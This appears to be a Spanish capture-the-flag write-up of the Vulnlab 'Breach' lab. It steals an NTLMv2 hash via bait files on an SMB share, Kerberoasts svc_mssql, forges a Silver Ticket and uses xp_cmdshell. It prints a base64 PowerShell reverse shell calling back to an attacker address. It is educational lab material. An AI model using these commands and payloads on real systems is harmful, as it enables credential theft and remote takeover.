---
layout: single
title: Breach - Vulnlab
excerpt: "En este post vamos a resolver la máquina Breach de la plataforma de Vulnlab en la cual mediante un recurso compartido por smb que tenemos permisos de escritura y lectura vamos a subir varios archivos para robar el hash ntlmv2 del usuario que está por detrás revisando los archivos gracias a eso vamos a un Silver Ticket para usar mssqlclient y poder desde allí ejecutar una reverse shell para la escalada de privilegios simplemente abusaremos del JuicyPotato, ya que tenemos el SeImpersonatePrivilege enable."
date: 2024-03-10
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/breached-vulnlab/icon.png
  teaser_home_page: true
categories:
  - Vulnlab
tags:  
  - SetImpersonatePrivilege
  - NTLMv2
  - Silver Ticket
---

## PortScan

- Estos son los puertos abiertos por el protocolo **TCP**.

```bash
➜  nmap cat targeted
# Nmap 7.94SVN scan initiated Sun Mar 10 12:11:59 2024 as: nmap -sCV -p53,135,139,445,636,3389,5985,49667 -oN targeted 10.10.90.80
Nmap scan report for 10.10.90.80
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2024-03-09T18:08:52
|_Not valid after:  2024-09-08T18:08:52
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-10T18:13:11+00:00
|_ssl-date: 2024-03-10T18:13:49+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-03-10T18:13:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 10 12:13:51 2024 -- 1 IP address (1 host up) scanned in 112.26 seconds
```

## Enumeracion

- Vamos a añadir los dominios al **/etc/hosts**.

```bash
➜  nmap echo "10.10.90.80 BREACHDC.breach.vl breach.vl" | sudo tee -a /etc/hosts
➜  nmap cat /etc/hosts | tail -n 1
10.10.90.80 BREACHDC.breach.vl breach.vl breachdc.breach.vl
```

- Estamos ante un Windows 10.

```bash
➜  nmap crackmapexec smb 10.10.90.80
SMB         10.10.90.80     445    BREACHDC         [*] Windows 10.0 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
➜  nmap
```

- Si tratamos de enumerar recursos por el protocolo **smb** con un usuario no válido, vemos que tenemos permisos de escritura en un directorio.
 
```bash
➜  nmap crackmapexec smb 10.10.90.80 -u 'miguel' -p '' --shares
SMB         10.10.90.80     445    BREACHDC         [*] Windows 10.0 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.10.90.80     445    BREACHDC         [+] breach.vl\miguel:
SMB         10.10.90.80     445    BREACHDC         [+] Enumerated shares
SMB         10.10.90.80     445    BREACHDC         Share           Permissions     Remark
SMB         10.10.90.80     445    BREACHDC         -----           -----------     ------
SMB         10.10.90.80     445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.10.90.80     445    BREACHDC         C$                              Default share
SMB         10.10.90.80     445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.10.90.80     445    BREACHDC         NETLOGON                        Logon server share
SMB         10.10.90.80     445    BREACHDC         share           READ,WRITE
SMB         10.10.90.80     445    BREACHDC         SYSVOL                          Logon server share
SMB         10.10.90.80     445    BREACHDC         Users           READ
➜  nmap
```

- Vemos estos directorios.

```bash
➜  nmap smbclient //10.10.90.80/share -U mike
Password for [WORKGROUP\mike]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Mar 10 16:35:07 2024
  ..                                DHS        0  Sun Mar 10 14:36:47 2024
  finance                             D        0  Sun Mar 10 12:41:54 2024
  software                            D        0  Sun Mar 10 12:42:11 2024
  transfer                            D        0  Sun Mar 10 12:46:14 2024

		7863807 blocks of size 4096. 2869324 blocks available
smb: \>
```

- Bueno, como tal tenemos permisos de escritura, vamos a generar varios archivos con esta herramienta <https://github.com/Greenwolf/ntlm_theft> para que, si alguien está revisando lo que hay por detrás, podremos robar su hash **ntlmv2**.

```bash
python3 ntlm_theft.py -g all -s 10.8.1.127 -f gracias
```

 - Ahora vamos a subir todos a un recurso compartido.

```bash
➜  gracias git:(master) ✗ ls
 Autorun.inf                   'gracias-(icon).url'              gracias.application   gracias.m3u   zoom-attack-instructions.txt
 desktop.ini                   'gracias-(includepicture).docx'   gracias.asx           gracias.pdf
'gracias-(externalcell).xlsx'  'gracias-(remotetemplate).docx'   gracias.htm           gracias.rtf
'gracias-(frameset).docx'      'gracias-(stylesheet).xml'        gracias.jnlp          gracias.scf
'gracias-(fulldocx).xml'       'gracias-(url).url'               gracias.lnk           gracias.wax
➜  gracias git:(master) ✗
```

- Ahora ejecutamos **smbserver** para que, en caso de que alguien los vea, nos llegue el hash.

```bash
➜  gracias git:(master) ✗ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Ahora subimos los archivos.

```bash
smb: \> prompt
smb: \> mput *
```

- Nos llega el **hash** del usuario **Julia.Wong**.

```bash
➜  gracias git:(master) ✗ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.90.80,64005)
[*] AUTHENTICATE_MESSAGE (BREACH\Julia.Wong,BREACHDC)
[*] User BREACHDC\Julia.Wong authenticated successfully
[*] Julia.Wong::BREACH:aaaaaaaaaaaaaaaa:3e40d29f310eb28c34f21d241a993d10:010100000000000080a012913c73da01d6121a030c011ad700000000010010005300490074005200460075007200440003001000530049007400520046007500720044000200100063005100410072006d007000760077000400100063005100410072006d007000760077000700080080a012913c73da01060004000200000008003000300000000000000001000000002000005dd443400a875f09d9e6d3915aca4e4296334ffc4bfb17b4f6fd97aecefd49a50a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000
[*] Closing down connection (10.10.90.80,64005)
[*] Remaining connections []
[*] Incoming connection (10.10.90.80,64007)
[*] AUTHENTICATE_MESSAGE (BREACH\Julia.Wong,BREACHDC)
[*] User BREACHDC\Julia.Wong authenticated successfully
```

## Cracking Hashes

- Ahora podemos crackear el hash:

```bash
➜  content john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
No password hashes left to crack (see FAQ)
➜  content john --show hash
Julia.Wong:*********:BREACH:aaaaaaaaaaaaaaaa:b1af69dd28821180ad840e6882ca2cfa:010100000000000000f9aa3c1b73da0191c4de8b02ee5c8a00000000010010006a0079006d0078006900550049006600030010006a0079006d00780069005500490066000200100075007600420065006a007a00690054000400100075007600420065006a007a00690054000700080000f9aa3c1b73da01060004000200000008003000300000000000000001000000002000005dd443400a875f09d9e6d3915aca4e4296334ffc4bfb17b4f6fd97aecefd49a50a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000

1 password hash cracked, 0 left
➜  content
```

- Las credenciales son correctas:

```bash
➜  content crackmapexec smb 10.10.90.80 -u 'julia.wong' -p '*********'
SMB         10.10.90.80     445    BREACHDC         [*] Windows 10.0 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.10.90.80     445    BREACHDC         [+] breach.vl\julia.wong:******
➜  content
```

- Como tenemos credenciales, podemos probar enumerar con **rpcclient** para ver el nombre de más usuarios en el dominio y probar si alguno reutiliza la contraseña.

```bash
➜  content rpcclient -U "julia.wong" 10.10.90.80
Password for [WORKGROUP\julia.wong]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Claire.Pope] rid:[0x451]
user:[Julia.Wong] rid:[0x452]
user:[Hilary.Reed] rid:[0x453]
user:[Diana.Pope] rid:[0x454]
user:[Jasmine.Price] rid:[0x455]
user:[George.Williams] rid:[0x456]
user:[Lawrence.Kaur] rid:[0x457]
user:[Jasmine.Slater] rid:[0x458]
user:[Hugh.Watts] rid:[0x459]
user:[Christine.Bruce] rid:[0x45a]
user:[svc_mssql] rid:[0x45b]
rpcclient $>
```

- Una vez añadidos a una lista, vamos a usar **kerbrute** <https://github.com/ropnop/kerbrute>.

```bash
➜  content ./kerbrute userenum -d breach.vl --dc BREACHDC.breach.vl users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/10/24 - Ronnie Flathers @ropnop

2024/03/10 16:55:39 >  Using KDC(s):
2024/03/10 16:55:39 >  	BREACHDC.breach.vl:88

2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Hilary.Reed@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Diana.Pope@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Claire.Pope@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Jasmine.Slater@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Lawrence.Kaur@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 George.Williams@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Julia.Wong@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Administrator@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Hugh.Watts@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Jasmine.Price@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 svc_mssql@breach.vl
2024/03/10 16:55:39 >  [+] VALID USERNAME:	 Christine.Bruce@breach.vl
2024/03/10 16:55:39 >  Done! Tested 12 usernames (12 valid) in 0.363 seconds
➜  content
```

- No obtenemos ningún hash.

```bash
➜  content impacket-GetNPUsers -no-pass -usersfile users.txt breach.vl/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Claire.Pope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Julia.Wong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Hilary.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Diana.Pope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jasmine.Price doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User George.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Lawrence.Kaur doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jasmine.Slater doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Hugh.Watts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Christine.Bruce doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_mssql doesn't have UF_DONT_REQUIRE_PREAUTH set
➜  content
```

- Y bueno, tampoco ningún otro usuario utiliza la contraseña.

```bash
➜  content crackmapexec smb 10.10.90.80 -u users.txt -p '*******' --continue-on-success
SMB         10.10.90.80     445    BREACHDC         [*] Windows 10.0 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Administrator:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Claire.Pope:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [+] breach.vl\Julia.Wong:*******
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Hilary.Reed:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Diana.Pope:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Jasmine.Price:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\George.Williams:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Lawrence.Kaur:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Jasmine.Slater:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Hugh.Watts:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\Christine.Bruce:******* STATUS_LOGON_FAILURE
SMB         10.10.90.80     445    BREACHDC         [-] breach.vl\svc_mssql:******* STATUS_LOGON_FAILURE
```

#  svc_mssql

- Bueno, lo que podemos hacer es `GetUserSPNs.py` para obtener los Service Principal Names (SPNs) asociados a la cuenta de usuario `julia.wong` en el dominio `breach.vl`.

```bash
➜  content impacket-GetUserSPNs breach.vl/julia.wong:******* -dc-ip 10.10.90.80 -request

Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2024-03-10 13:07:33.948684



$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$5b4dae2547b8617af18129a42d692a74$74a69d21a71e72864267926604707308c0e0a55f933f0f012d0eced7716e15269d17df37c6468a985c6a60e9df91eccc3e52a2c257848c571e05ef3005067adeef97cc9e9c9e0a7c6ab48a6abd4e329adaf93f626bb3af4a8ee30722a634d2ee1f9eab777275d285916cf9bc37c26653d571fda1f34224b7ef1660c45ad846ad8cd60182a0bf6d83d905198810665ae7167e4522025262587c22afa4604596853af14fd88b3d699debda935e1217bd425e417073a50466c6ae343839c2840c70791113126dcde8281db6efb55f1830a5cae3b0141492f0ac61e17ff70d3faab994a27f27d595d12034167bd147a8058c8bc879f73ea6cf92d7f8d74207f206c283291e49ca107447b8731be259bacc31f75f26fbb993e321a5e7ed0639a5e74c4b82b43764db20168943a9af858f8e51db0d408853681063bc7b18a81690fc372f7034081eecec8138b0024c3e97023b2f8df0619f0815c8397fa3fed25fbcca297e00ebd7ba342fb72ec3bcd20d1464e493354396dbdf2e76f1ae5c391e65fd0c044a91640fed65f256b93af2aad4547c40ef245f6f7fbb66736cb47d2710f622ecf55520d90b0d08b84b1e35f798b3a52be99e7fcc7ab7ba0431f4d1dc2cefe6dad071283bd3c8f90dbe7382e44ebd0c5f669ef89c7c7ce9a0c0fbd62269d53df966326c6d3128f244be2a55934489ad82126fab57b870810d5efb34bf4b099ad4f69bf16d3ba75c379f4770b7ce446a98dd8c09f8f6033073c30a3da8b2e3b9f47d074adca10613b66672083fee8a6d84d07b7e8efa2bbff4212646a21b909fe648788474b6873f17e72f99e0df2c981ec4a82903232ff9914c2dc88e713e7cf752a3013cdc7b25245b9d9f14bbafc1c1272821f59bd9892f11583bf78f4ee3c74d51a3df1dfcfefe5b54ebdcf2418b5c1da1feb547284543e9f09a30d9510878c7e9b34010aa121d8782eb81679666c6ce4858ab7109ece8f7ff2c34cb9dd24e6adfb493d278d9c93da0abbf5a72a9ca2c61db682ef6730738bfa9f463175b05360031a2793764326ec1e630dbe784d6fbaf0d654a31f3ce527b3abf81115d283a50e84cf939021744ba52f578d57ef0299ed242812b6b8def1519a7e87dbbb4e8cc7e67a7a2eaecc61b10dd85c763dae90da0cf1adb967f7360dd0c002aa6eb0b2a09dd198d7d18efcde603597383b37b28ff9922b84447d367d8a8c0b35e84f739d2c74e9786087e6127215e513132a6f472c5ef97e3489f071d799b2095cf82756fb1d8e44bd007952afbcd43c9ca067d4fb774144d97b7e4a5c23ef39961228f3cd0f621a1ea28dc34599d64a55d31955d9a62d01f8281b4391707555c4046e5d28b8b9addf05aaba067b7970e149d3034cd1b9a56c1c8aa2e0a5894a32768b879fec62b1693dc8eab4ae317a79a97662f2f0f7e0efffbe9a1ac4ec717e4c60d3cd18afc4c914e82e2dd56be96c6d73f
➜  content
```

- Obtenemos un **hash** de kerberos del usuario `svc_mssql` que podemos **crackearlo** .

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
No password hashes left to crack (see FAQ)
```

## Silver Ticket

- Bueno, ahora lo que podemos hacer es un **Silver Ticket** para suplantar al usuario **administrator** . Lo primero que necesitamos es el SID (Security Identifier) del dominio. Es un identificador único que se asigna a cada dominio de Active Directory en un entorno de Windows. Es un valor alfanumérico que se utiliza para identificar de manera única el dominio en toda la infraestructura de Active Directory. <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket>.

- También puedes guardar el **hash** directamente de esta forma:

```bash
➜  content impacket-GetUserSPNs -request -dc-ip breach.vl breach.vl/Julia.Wong:Computer1 -save -outputfile kerboras.txt
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2024-03-10 13:07:33.948684
```

- Mediante `getPac` obtenemos el **sid**.

```bash
➜  content impacket-getPac -targetUser administrator breach.vl/julia.wong:*********
Impacket v0.11.0 - Copyright 2023 Fortra

KERB_VALIDATION_INFO
LogonTime:
    dwLowDateTime:                   2560514102
    dwHighDateTime:                  30942228
LogoffTime:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
KickOffTime:
    dwLowDateTime:                   4294967295
    dwHighDateTime:                  2147483647
PasswordLastSet:
    dwLowDateTime:                   1978590349
    dwHighDateTime:                  30942177
PasswordCanChange:
    dwLowDateTime:                   2690163853
    dwHighDateTime:                  30942378
PasswordMustChange:
    dwLowDateTime:                   1799906445
    dwHighDateTime:                  30950626
EffectiveName:                   'Administrator'
FullName:                        ''
LogonScript:                     ''
ProfilePath:                     ''
HomeDirectory:                   ''
HomeDirectoryDrive:              ''
LogonCount:                      45
BadPasswordCount:                5
UserId:                          500
PrimaryGroupId:                  513
GroupCount:                      5
GroupIds:
    [

        RelativeId:                      520
        Attributes:                      7 ,

        RelativeId:                      512
        Attributes:                      7 ,

        RelativeId:                      513
        Attributes:                      7 ,

        RelativeId:                      518
        Attributes:                      7 ,

        RelativeId:                      519
        Attributes:                      7 ,
    ]
UserFlags:                       544
UserSessionKey:
    Data:                            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
LogonServer:                     'BREACHDC'
LogonDomainName:                 'BREACH'
LogonDomainId:
    Revision:                        1
    SubAuthorityCount:               4
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05'
    SubAuthority:
        [
             21,
             2330692793,
             3312915120,
             706255856,
        ]
LMKey:                           b'\x00\x00\x00\x00\x00\x00\x00\x00'
UserAccountControl:              131088
SubAuthStatus:                   0
LastSuccessfulILogon:
    dwLowDateTime:                   0
    dwHighDateTime:                  0
LastFailedILogon:
    dwLowDateTime:                   0
    dwHighDateTime:                  0
FailedILogonCount:               0
Reserved3:                       0
SidCount:                        1
ExtraSids:
    [

        Sid:
            Revision:                        1
            SubAuthorityCount:               1
            IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x12'
            SubAuthority:
                [
                     2,
                ]
        Attributes:                      7 ,
    ]
ResourceGroupDomainSid:
    Revision:                        1
    SubAuthorityCount:               4
    IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05'
    SubAuthority:
        [
             21,
             2330692793,
             3312915120,
             706255856,
        ]
ResourceGroupCount:              1
ResourceGroupIds:
    [

        RelativeId:                      572
        Attributes:                      536870919 ,
    ]
Domain SID: S-1-5-21-2330692793-3312915120-706255856

 0000   10 00 00 00 2E A4 16 0B  BD EE B3 4C B6 CF 09 CC   ...........L....
```

- Una vez hecho esto, necesitamos crear un hash ntlmv2 para el servicio mssql en este caso que corresponde a la contraseña del usuario **svc_msqql** <https://codebeautify.org/ntlm-hash-generator>.

![](/assets/images/breached-vulnlab/1.png)

- Ahora con **ticketer** vamos a generar un **ticket** como **administrator** con toda la información que tenemos.

```bash
➜  content impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip breachdc -spn MSSQLSvc/breachdc.breach.vl:1433 Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

-  Ahora vamos a establecer `KRB5CCNAME` en el valor `Administrator.ccache`, se indica al sistema que utilice este archivo específico como el archivo de caché de credenciales de Kerberos para las operaciones de autenticación en curso.

 ```bash
➜  content export KRB5CCNAME=Administrator.ccache
```

- Ahora nos podemos conectar.

```bash
➜  content impacket-mssqlclient -k breachdc.breach.vl
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)>
```

- Algo que podemos hacer como **Administrator** es habilitar el módulo **xp_cmdshell** para ejecutar comandos.

```bash
SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
[*] INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell whoami
output
----------------
breach\svc_mssql

NULL

SQL (BREACH\Administrator  dbo@master)>
```

- Para obtener una reverse shell para ejecutar un payload en PowerShell para eso puedes usar el siguiente recurso: <https://github.com/t3l3machus/hoaxshell>.

- Ahora, para obtener una reverse Shell vamos a ejecutarlo.

```bash
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell powershell -e JABzAD0AJwAxADAALgA4AC4AMQAuADEAMgA3ADoAOAAwADgAMAAnADsAJABpAD0AJwBmADYAYQBkADEANwA0ADQALQA3ADUAOQA5ADIAZAA5ADQALQA4ADQAYQBhAGQAYgA5AGQAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA2AGEAZAAxADcANAA0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGQAYwBlADUALQA4ADcAYwAyACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADcANQA5ADkAMgBkADkANAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADQAYQBhAGQAYgA5AGQAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
```

- Nos llega la Shell.

```bash
➜  hoaxshell git:(main) ✗ python3 hoaxshell.py -s 10.8.1.127

    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬
    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │
    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘
                           by t3l3machus

[Info] Generating reverse shell payload...
powershell -e JABzAD0AJwAxADAALgA4AC4AMQAuADEAMgA3ADoAOAAwADgAMAAnADsAJABpAD0AJwBmADYAYQBkADEANwA0ADQALQA3ADUAOQA5ADIAZAA5ADQALQA4ADQAYQBhAGQAYgA5AGQAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZgA2AGEAZAAxADcANAA0ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtAGQAYwBlADUALQA4ADcAYwAyACIAPQAkAGkAfQA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewAkAGMAPQAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADcANQA5ADkAMgBkADkANAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AKQAuAEMAbwBuAHQAZQBuAHQAOwBpAGYAIAAoACQAYwAgAC0AbgBlACAAJwBOAG8AbgBlACcAKQAgAHsAJAByAD0AaQBlAHgAIAAkAGMAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAAIAAtAEUAcgByAG8AcgBWAGEAcgBpAGEAYgBsAGUAIABlADsAJAByAD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAByADsAJAB0AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAcAAkAHMALwA4ADQAYQBhAGQAYgA5AGQAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQBkAGMAZQA1AC0AOAA3AGMAMgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A
Copied to clipboard!
